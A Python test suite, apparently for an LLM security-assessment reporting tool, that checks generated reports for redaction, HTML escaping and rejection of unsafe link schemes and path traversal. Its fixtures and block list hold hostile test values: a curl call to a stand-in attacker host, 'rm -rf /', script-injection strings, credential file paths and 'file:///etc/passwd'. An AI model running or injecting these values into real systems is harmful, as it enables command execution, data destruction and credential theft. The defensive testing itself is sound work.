from __future__ import annotations

import json
import re
from dataclasses import replace
from pathlib import Path

from malleus.assessment_reporting import AssessmentEvidenceRef, AssessmentReportInput, write_assessment_reports


HOSTILE_PAYLOAD = (
    "<script>alert(1)</script> javascript:alert(1) Bearer token "
    "/home/alice/private/.env /Users/alice/private/.env /root/.ssh/id_rsa "
    "C:\\Users\\alice\\private\\report.json C:/Users/alice/private/report.json "
    "$(curl https://evil.example/pwn)|; rm -rf / # replay-ish"
)

EXPECTED_TOP_LEVEL_ARTIFACTS = {
    "risk-report.json",
    "risk-report.html",
    "executive-summary.md",
    "strengths-weaknesses.md",
    "assessment-manifest.json",
}
EXPECTED_CANONICAL_ARTIFACTS = {
    "coverage/coverage.json",
    "coverage/coverage.md",
    "coverage/coverage.html",
    "findings/findings.json",
    "findings/findings.md",
    "remediation/remediation-board.md",
    "remediation/issue-export.json",
    "remediation/patches/README.md",
    "regression/regression-pack.yaml",
    "regression/replay-commands.md",
    "evidence-bundle/index.html",
    "evidence-bundle/artifact-index.json",
    "evidence-bundle/audit-summary.md",
    "studio/index.html",
}
FORBIDDEN_PUBLIC_STRINGS = [
    "<script",
    "javascript:",
    "Bearer ",
    "/home/",
    "/Users/",
    "/root/",
    "C:\\Users",
    "C:/Users",
    "rm -rf",
    "https://evil.example",
    "$(curl",
    "raw_prompt",
    "raw_response",
    "RunReport",
]


def _assessment_input() -> AssessmentReportInput:
    evidence = AssessmentEvidenceRef(
        evidence_id="ev-core-001",
        artifact_path="evidence-bundle/redacted/core-001.json",
        artifact_type="redacted_case_preview",
        sha256="a" * 64,
        source_length=157,
        redacted_length=92,
        redacted_preview="[REDACTED sha256=aaaaaaaa length=157] model refused unsafe request",
        metadata={"case_id": "core:ib-do-001", "unsafe_note": HOSTILE_PAYLOAD},
    )
    return AssessmentReportInput(
        assessment_id="assessment-2026-04-25T00-00-00Z",
        generated_at="2026-04-25T00:00:00Z",
        target={
            "name": "prod-chatbot<script>alert(1)</script>",
            "adapter": "openai_compatible",
            "base_url": "https://api.vendor.example/v1",
            "environment": "/home/alice/private/.env",
        },
        provider={
            "name": "Example Provider",
            "model": "model-x<script>alert(1)</script>",
            "config_hash": "cfg-123",
            "api_key_preview": "Bearer token",
        },
        profile="rag-agent",
        mode="local_fixture",
        packs=[
            {
                "id": "core",
                "title": "Core LLM Security",
                "tier": "core",
                "maturity": "stable",
                "score_use": "included",
                "applicability": "applicable",
                "mode": "live_provider",
                "evidence_strengths": ["model_behavior"],
                "primary_score_evidence": ["model_behavior"],
                "score": {"earned": 82, "possible": 100, "pass_rate": 0.82},
            },
            {
                "id": "artifact_challenge",
                "title": "Artifact Challenge",
                "tier": "advanced",
                "maturity": "beta",
                "score_use": "advisory",
                "applicability": "applicable",
                "mode": "local_fixture",
                "evidence_strengths": ["fixture_behavior", "static_analysis"],
                "primary_score_evidence": ["fixture_behavior"],
                "score": {"earned": 3, "possible": 5, "pass_rate": 0.6},
            },
            {
                "id": "taxonomy",
                "title": "Taxonomy Coverage",
                "tier": "core",
                "maturity": "stable",
                "score_use": "excluded",
                "applicability": "applicable",
                "mode": "local_fixture",
                "evidence_strengths": ["static_analysis"],
                "primary_score_evidence": [],
                "score": {"earned": 0, "possible": 0, "pass_rate": None},
            },
            {
                "id": "visual",
                "title": "Visual Injection",
                "tier": "advanced",
                "maturity": "beta",
                "score_use": "not_applicable",
                "applicability": "not_applicable",
                "mode": "local_fixture",
                "evidence_strengths": ["fixture_behavior"],
                "primary_score_evidence": [],
                "score": {"earned": 0, "possible": 0, "pass_rate": None},
            },
            {
                "id": "ui_harness",
                "title": "UI Harness",
                "tier": "experimental",
                "maturity": "scaffold",
                "score_use": "not_tested",
                "applicability": "scaffold_only",
                "mode": "scaffold",
                "evidence_strengths": ["planning_only"],
                "primary_score_evidence": [],
                "score": {"earned": 0, "possible": 0, "pass_rate": None},
            },
        ],
        scores={
            "primary": {"earned": 82, "possible": 100, "pass_rate": 0.82},
            "advisory": {"earned": 3, "possible": 5, "pass_rate": 0.6},
            "excluded": {"earned": 0, "possible": 0, "pass_rate": None},
        },
        findings=[
            {
                "finding_id": "finding-001<script>alert(1)</script>",
                "pack_id": "core",
                "case_id": "core:ib-do-001",
                "severity": "high",
                "status": "fail",
                "title": "Instruction-boundary weakness",
                "summary": HOSTILE_PAYLOAD,
                "raw_prompt": HOSTILE_PAYLOAD,
                "raw_response": HOSTILE_PAYLOAD,
                "evidence_refs": [evidence],
                "remediation_ref": "remediation/remediation-board.md#finding-001",
            }
        ],
        coverage=[
            {
                "dimension": "attack_surface",
                "value": "retrieval_context",
                "status": "covered",
                "pack_ids": ["core", "rag"],
                "evidence_refs": [evidence],
            },
            {
                "dimension": "deployment_surface",
                "value": "browser_ui",
                "status": "not_tested",
                "pack_ids": ["ui_harness"],
                "evidence_refs": [],
            },
        ],
        evidence_refs=[evidence],
        gate={"status": "warn", "reasons": ["high finding requires remediation"], "policy": "default"},
        remediation_refs=[{"finding_id": "finding-001", "path": "remediation/remediation-board.md#finding-001"}],
        regression_refs=[{"pack_id": "core", "path": "regression/regression-pack.yaml", "case_ids": ["core:ib-do-001"]}],
        artifact_paths={
            "coverage_json": "coverage/coverage.json",
            "coverage_markdown": "coverage/coverage.md",
            "findings_json": "findings/findings.json",
            "findings_markdown": "findings/findings.md",
            "remediation_board": "remediation/remediation-board.md",
            "regression_pack": "regression/regression-pack.yaml",
            "evidence_index": "evidence-bundle/artifact-index.json",
            "studio_index": "studio/index.html",
        },
        metadata={"source_report_type": "RunReport", "unsafe_replay": HOSTILE_PAYLOAD},
    )


def _write_reports(tmp_path: Path) -> tuple[object, dict]:
    result = write_assessment_reports(_assessment_input(), tmp_path)
    risk_report = json.loads((tmp_path / "risk-report.json").read_text(encoding="utf-8"))
    return result, risk_report


def _artifact_texts(out_dir: Path) -> dict[str, str]:
    paths = EXPECTED_TOP_LEVEL_ARTIFACTS | EXPECTED_CANONICAL_ARTIFACTS
    return {path: (out_dir / path).read_text(encoding="utf-8") for path in paths if (out_dir / path).exists()}


def _assert_relative_artifact_path(path: str) -> None:
    assert path
    assert not Path(path).is_absolute()
    assert ".." not in Path(path).parts
    assert not path.startswith(("http://", "https://"))


def test_write_assessment_reports_creates_canonical_artifacts_and_manifest(tmp_path: Path) -> None:
    result, risk_report = _write_reports(tmp_path)

    for relative_path in EXPECTED_TOP_LEVEL_ARTIFACTS | EXPECTED_CANONICAL_ARTIFACTS:
        artifact = tmp_path / relative_path
        assert artifact.exists(), f"missing assessment artifact {relative_path}"
        assert artifact.is_file()
        assert artifact.read_text(encoding="utf-8").strip()

    manifest = json.loads((tmp_path / "assessment-manifest.json").read_text(encoding="utf-8"))
    assert manifest["schema_version"] == "malleus.assessment_manifest.v1"
    assert manifest["assessment_id"] == risk_report["assessment_id"]
    assert manifest["profile"] == "rag-agent"
    assert manifest["mode"] == "local_fixture"
    assert manifest["target_config_path"] == "unknown"
    assert manifest["provider_calls_enabled"] is False
    assert manifest["network_enabled"] is False
    assert manifest["browser_enabled"] is False
    assert manifest["git_commit"] == "unknown"
    assert manifest["schema_versions"]["risk_report"] == "malleus.assessment_risk_report.v1"
    assert manifest["raw_artifact_mapping"] == "raw/<pack-id>/planning-metadata.json"
    assert manifest["remediation_patch_mapping"] == "remediation/patches/README.md"
    assert manifest["generated_artifacts"] == manifest["artifacts"]
    manifest_artifacts = {artifact["relative_path"]: artifact for artifact in manifest["artifacts"]}
    assert set(manifest_artifacts) == EXPECTED_TOP_LEVEL_ARTIFACTS | EXPECTED_CANONICAL_ARTIFACTS
    for relative_path, artifact in manifest_artifacts.items():
        _assert_relative_artifact_path(relative_path)
        assert artifact["path"] == relative_path
        assert re.fullmatch(r"[0-9a-f]{64}", artifact["sha256"])
        assert artifact["artifact_schema_version"] == "malleus.artifact.v1"
        assert artifact["redaction_status"] in {"redacted", "not_applicable"}
    assert getattr(result, "manifest_path") == tmp_path / "assessment-manifest.json"


def test_risk_report_uses_normalized_schema_evidence_refs_and_relative_paths(tmp_path: Path) -> None:
    _result, risk_report = _write_reports(tmp_path)

    assert risk_report["schema_version"] == "malleus.assessment_risk_report.v1"
    assert risk_report["assessment_id"] == "assessment-2026-04-25T00-00-00Z"
    assert risk_report["generated_at"] == "2026-04-25T00:00:00Z"
    assert risk_report["profile"] == "rag-agent"
    assert risk_report["mode"] == "local_fixture"
    assert risk_report["target"] == {
        "name": "prod-chatbot[REDACTED]",
        "adapter": "openai_compatible",
        "base_url_host": "api.vendor.example",
    }
    assert risk_report["provider"] == {"name": "Example Provider", "model": "model-x[REDACTED]", "config_hash": "cfg-123"}

    packs = {pack["id"]: pack for pack in risk_report["packs"]}
    assert list(packs) == ["core", "artifact_challenge", "taxonomy", "visual", "ui_harness"]
    assert packs["core"]["tier"] == "core"
    assert packs["core"]["maturity"] == "stable"
    assert packs["core"]["score_use"] == "included"
    assert packs["artifact_challenge"]["score_use"] == "advisory"
    assert packs["visual"]["applicability"] == "not_applicable"
    assert packs["ui_harness"]["applicability"] == "scaffold_only"
    assert packs["ui_harness"]["score_use"] == "not_tested"
    assert packs["artifact_challenge"]["evidence_strengths"] == ["fixture_behavior", "static_analysis"]

    assert risk_report["scores"]["primary"]["earned"] == 82
    assert risk_report["gate"]["status"] == "warn"
    assert risk_report["findings"][0]["evidence_refs"] == ["ev-core-001"]
    assert "raw_prompt" not in risk_report["findings"][0]
    assert "raw_response" not in risk_report["findings"][0]
    assert risk_report["coverage"][0]["evidence_refs"] == ["ev-core-001"]
    assert risk_report["remediation_refs"] == [{"finding_id": "finding-001", "path": "remediation/remediation-board.md#finding-001"}]
    assert risk_report["regression_refs"] == [{"pack_id": "core", "path": "regression/regression-pack.yaml", "case_ids": ["core:ib-do-001"]}]
    assert risk_report["metadata"]["source_report_type"] == "[REDACTED]"

    for artifact_path in risk_report["artifacts"].values():
        _assert_relative_artifact_path(artifact_path)
    for evidence_ref in risk_report["evidence_refs"]:
        assert set(evidence_ref) == {
            "evidence_id",
            "artifact_path",
            "artifact_type",
            "sha256",
            "source_length",
            "redacted_length",
            "redacted_preview",
        }
        _assert_relative_artifact_path(evidence_ref["artifact_path"])
        assert "sha256=" in evidence_ref["redacted_preview"]
        assert "length=157" in evidence_ref["redacted_preview"]


def test_evidence_bundle_index_includes_required_metadata_and_disambiguates_duplicate_names(tmp_path: Path) -> None:
    core_evidence = AssessmentEvidenceRef(
        evidence_id="ev-core-planning",
        artifact_path="raw/core/planning-metadata.json",
        artifact_type="provider_free_pack_metadata",
        sha256="b" * 64,
        source_length=321,
        redacted_length=210,
        redacted_preview="core planning [REDACTED evidence sha256=bbbbbbbbbbbbbbbb length=321]",
        metadata={"pack_id": "core", "mode": "dry_run", "evidence_strength": "planning_only"},
    )
    rag_evidence = AssessmentEvidenceRef(
        evidence_id="ev-rag-planning",
        artifact_path="raw/rag/planning-metadata.json",
        artifact_type="provider_free_pack_metadata",
        sha256="c" * 64,
        source_length=654,
        redacted_length=432,
        redacted_preview="rag planning [REDACTED evidence sha256=cccccccccccccccc length=654]",
        metadata={"pack_id": "rag", "mode": "dry_run", "evidence_strength": "planning_only"},
    )
    base = _assessment_input()
    report_input = replace(
        base,
        mode="dry_run",
        packs=[
            {
                "id": "core",
                "title": "Core LLM Security",
                "tier": "core",
                "maturity": "stable",
                "score_use": "included",
                "applicability": "applicable",
                "mode": "dry_run",
                "evidence_strengths": ["planning_only"],
                "primary_score_evidence": [],
            },
            {
                "id": "rag",
                "title": "RAG Injection",
                "tier": "core",
                "maturity": "stable",
                "score_use": "not_tested",
                "applicability": "requires_fixture",
                "mode": "dry_run",
                "evidence_strengths": ["planning_only"],
                "primary_score_evidence": [],
            },
        ],
        findings=[],
        coverage=[
            {"dimension": "assessment_pack", "value": "core", "status": "planned", "pack_ids": ["core"], "evidence_refs": [core_evidence]},
            {"dimension": "assessment_pack", "value": "rag", "status": "requires_fixture", "pack_ids": ["rag"], "evidence_refs": [rag_evidence]},
        ],
        evidence_refs=[core_evidence, rag_evidence],
    )
    write_assessment_reports(report_input, tmp_path)

    artifact_index = json.loads((tmp_path / "evidence-bundle" / "artifact-index.json").read_text(encoding="utf-8"))
    artifacts = artifact_index["artifacts"]
    assert [artifact["relative_path"] for artifact in artifacts] == ["raw/core/planning-metadata.json", "raw/rag/planning-metadata.json"]
    assert {Path(artifact["relative_path"]).name for artifact in artifacts} == {"planning-metadata.json"}
    assert {artifact["pack_id"] for artifact in artifacts} == {"core", "rag"}
    assert len({artifact["stable_ref"] for artifact in artifacts}) == 2
    assert all(artifact["pack_id"] in artifact["stable_ref"] for artifact in artifacts)
    assert all(artifact["relative_path"] in artifact["stable_ref"] for artifact in artifacts)
    for artifact in artifacts:
        assert {
            "pack_id",
            "relative_path",
            "sha256",
            "source_length",
            "redacted_length",
            "mode",
            "mode_label",
            "evidence_strength",
            "artifact_type",
            "evidence_id",
            "stable_ref",
        } <= set(artifact)
        _assert_relative_artifact_path(artifact["relative_path"])
        assert artifact["artifact_type"] == "provider_free_pack_metadata"
        assert artifact["evidence_strength"] == "planning_only"

    evidence_html = (tmp_path / "evidence-bundle" / "index.html").read_text(encoding="utf-8")
    studio_html = (tmp_path / "studio" / "index.html").read_text(encoding="utf-8")
    assert "raw/core/planning-metadata.json" in evidence_html
    assert "raw/rag/planning-metadata.json" in evidence_html
    assert "raw/core/planning-metadata.json" in studio_html
    assert "raw/rag/planning-metadata.json" in studio_html
    assert 'href="../raw/' not in evidence_html
    assert 'href="../raw/' not in studio_html


def test_assessment_html_rejects_unsafe_artifact_href_schemes_and_encoded_traversal(tmp_path: Path) -> None:
    evidence_refs = [
        AssessmentEvidenceRef(
            evidence_id="ev-data",
            artifact_path="evidence-bundle/data:text/html,<svg/onload=alert(1)>",
            artifact_type="provider_free_pack_metadata",
            sha256="d" * 64,
            source_length=10,
            redacted_length=10,
            redacted_preview="data path [REDACTED evidence sha256=dddddddddddddddd length=10]",
            metadata={"pack_id": "core", "mode": "dry_run", "evidence_strength": "planning_only"},
        ),
        AssessmentEvidenceRef(
            evidence_id="ev-file",
            artifact_path="studio/file:///etc/passwd",
            artifact_type="provider_free_pack_metadata",
            sha256="e" * 64,
            source_length=11,
            redacted_length=11,
            redacted_preview="file path [REDACTED evidence sha256=eeeeeeeeeeeeeeee length=11]",
            metadata={"pack_id": "rag", "mode": "dry_run", "evidence_strength": "planning_only"},
        ),
        AssessmentEvidenceRef(
            evidence_id="ev-traversal",
            artifact_path="studio/%2e%2e/secrets.txt",
            artifact_type="provider_free_pack_metadata",
            sha256="f" * 64,
            source_length=12,
            redacted_length=12,
            redacted_preview="encoded traversal [REDACTED evidence sha256=ffffffffffffffff length=12]",
            metadata={"pack_id": "tools", "mode": "dry_run", "evidence_strength": "planning_only"},
        ),
    ]
    base = _assessment_input()
    report_input = replace(
        base,
        evidence_refs=evidence_refs,
        coverage=[],
        findings=[],
        artifact_paths={
            "studio_index": "studio/data:text/html,<svg/onload=alert(1)>",
            "evidence_bundle_index": "evidence-bundle/vbscript:msgbox(1)",
            "coverage_html": "coverage/%2e%2e/escape.html",
        },
    )
    write_assessment_reports(report_input, tmp_path)

    public = "\n".join(
        [
            (tmp_path / "studio" / "index.html").read_text(encoding="utf-8"),
            (tmp_path / "evidence-bundle" / "index.html").read_text(encoding="utf-8"),
            (tmp_path / "evidence-bundle" / "artifact-index.json").read_text(encoding="utf-8"),
        ]
    ).lower()
    assert "data:text" not in public
    assert "file://" not in public
    assert "vbscript:" not in public
    assert "%2e%2e" not in public
    assert 'href="//' not in public
    assert re.search(r"href=[\"'][a-z][a-z0-9+.-]*:", public) is None


def test_public_assessment_artifacts_redact_escape_and_avoid_external_dependencies(tmp_path: Path) -> None:
    _write_reports(tmp_path)
    texts = _artifact_texts(tmp_path)

    assert EXPECTED_TOP_LEVEL_ARTIFACTS | EXPECTED_CANONICAL_ARTIFACTS <= set(texts)
    for relative_path, text in texts.items():
        lowered = text.lower()
        for forbidden in FORBIDDEN_PUBLIC_STRINGS:
            assert forbidden.lower() not in lowered, f"{relative_path} leaked {forbidden!r}"
        assert "[REDACTED" in text or relative_path in {"regression/regression-pack.yaml"}

    for html_path in ["risk-report.html", "coverage/coverage.html", "evidence-bundle/index.html", "studio/index.html"]:
        html = texts[html_path]
        lowered = html.lower()
        assert "&lt;script&gt;alert(1)&lt;/script&gt;" in lowered or "[redacted" in lowered
        assert "<script" not in lowered
        assert "<iframe" not in lowered
        assert "javascript:" not in lowered
        assert "http://" not in lowered
        assert "https://" not in lowered
        assert "cdn" not in lowered
        assert "fonts.googleapis" not in lowered
        assert re.search(r"\son[a-z]+\s*=", lowered) is None


def test_score_use_explanation_distinguishes_inclusion_applicability_and_evidence_strengths(tmp_path: Path) -> None:
    _result, risk_report = _write_reports(tmp_path)
    executive = (tmp_path / "executive-summary.md").read_text(encoding="utf-8")
    strengths = (tmp_path / "strengths-weaknesses.md").read_text(encoding="utf-8")
    html = (tmp_path / "risk-report.html").read_text(encoding="utf-8")

    explanation = risk_report["score_use_explanation"]
    assert explanation["included"] == "Contributes to the primary assessment score."
    assert explanation["advisory"] == "Reported for context but excluded from the primary score."
    assert explanation["excluded"] == "Tracked as metadata, coverage, or infrastructure and excluded from scoring."
    assert explanation["not_applicable"] == "Pack is not applicable to the selected profile or target."
    assert explanation["not_tested"] == "Pack was not executed or is scaffold-only in this run."
    assert explanation["evidence_strengths"]["model_behavior"] == "Live or recorded model behavior evidence."
    assert explanation["evidence_strengths"]["fixture_behavior"] == "Provider-free local fixture evidence."
    assert explanation["evidence_strengths"]["static_analysis"] == "Deterministic local artifact or configuration analysis."
    assert explanation["evidence_strengths"]["planning_only"] == "Planning/scaffold evidence; never primary score evidence."

    for text in [executive, strengths, html]:
        assert "included" in text
        assert "advisory" in text
        assert "excluded" in text
        assert "not_applicable" in text
        assert "not_tested" in text
        assert "scaffold-only" in text
        assert "model_behavior" in text
        assert "fixture_behavior" in text
        assert "static_analysis" in text
        assert "planning_only" in text


def test_executive_and_strength_reports_include_prd_triage_and_retest_sections(tmp_path: Path) -> None:
    _write_reports(tmp_path)
    executive = (tmp_path / "executive-summary.md").read_text(encoding="utf-8")
    strengths = (tmp_path / "strengths-weaknesses.md").read_text(encoding="utf-8")
    patches = (tmp_path / "remediation" / "patches" / "README.md").read_text(encoding="utf-8")

    for required in [
        "Overall posture",
        "Primary score",
        "Coverage confidence",
        "Critical findings",
        "High findings",
        "Recommended next actions",
        "Caveats and limitations",
    ]:
        assert required in executive
    for required in [
        "Assessment posture",
        "Category scores",
        "Per-attack-pack results",
        "Why it matters",
        "Remediation priorities",
        "Retest commands",
        "regression/replay-commands.md",
    ]:
        assert required in strengths
    assert "remediation/patches/" in patches
    assert "No executable patch content" in patches
